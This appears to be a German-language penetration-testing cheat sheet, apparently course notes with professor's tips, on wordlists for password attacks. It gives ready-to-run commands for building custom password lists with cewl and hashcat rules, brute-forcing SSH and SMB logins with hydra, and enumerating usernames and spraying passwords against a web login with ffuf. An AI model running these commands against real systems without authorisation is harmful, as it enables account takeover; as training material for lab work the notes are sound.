# 📜 Wordlists

> **Hinweis Prof:** Nicht nur riesige Listen. Oft musst du aus Hinweisen eine kleine Liste bauen.

---

## Standard-Orte

```bash
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Usernames/
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

Falls fehlt:

```bash
sudo apt install seclists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
```

---

## Web-Directories

```bash
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
```

> **Hinweis Prof:** Gobuster mit größerer Wordlist, nicht nur `common.txt`.

---

## Eigene Kandidatenliste

```bash
cewl http://$RHOST/ -m 4 -w cewl.txt

cat > hints.txt <<'EOF'
Firmenname
Vorname
Hundename
Projektname
Sommer2026
EOF

cat cewl.txt hints.txt | sort -u > words.txt
hashcat --stdout words.txt -r /usr/share/hashcat/rules/best64.rule > words_mut.txt
```

Hydra:

```bash
hydra -l user -P words_mut.txt ssh://$RHOST -t4 -f -V
hydra -L users.txt -P words_mut.txt smb://$RHOST -t4 -f -V
```

---

## Default-Creds suchen

```bash
grep -i '<appname>' /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

---

## Username-Enumeration und Login-Fuzzing mit ffuf

### Existierende User über eine eindeutige Meldung finden

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
  -X POST \
  -d 'username=FUZZ&email=x&password=x&cpassword=x' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u "http://$RHOST/customers/signup" \
  -mr 'username already exists' \
  -o ffuf_users.json -of json
```

- `FUZZ` ist der Platzhalter für die Username-Liste.
- `-mr` matcht einen eindeutigen Response-Text.
- URL, Feldnamen und Match-Text an die echte Anwendung anpassen.
- Treffer extrahieren: `jq -r '.results[].input.FUZZ' ffuf_users.json | sort -u > valid_usernames.txt`.

### Zwei Listen gleichzeitig testen

```bash
ffuf -w valid_usernames.txt:W1 \
  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST \
  -d 'username=W1&password=W2' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u "http://$RHOST/customers/login" \
  -mode clusterbomb -rate 10 \
  -fc 200
```

- `W1` = Benutzername, `W2` = Passwort.
- `-fc 200` blendet `200` aus; nur verwenden, wenn du vorher bestätigt hast, dass falsche Logins 200 liefern.
- Alternativen: `-fs <BYTES>`, `-fw <WÖRTER>`, `-mr '<ERFOLGSTEXT>'`.
- `-mode clusterbomb` testet jede Kombination aus W1 und W2; `-rate 10` reduziert Lockout-/Rate-Limit-Risiko.

> **Hinweis Prof:** Erst Website-Hinweise und Username-Enumeration nutzen. Danach eine kleine, plausible Passwortliste gezielt gegen die validen Benutzer testen.
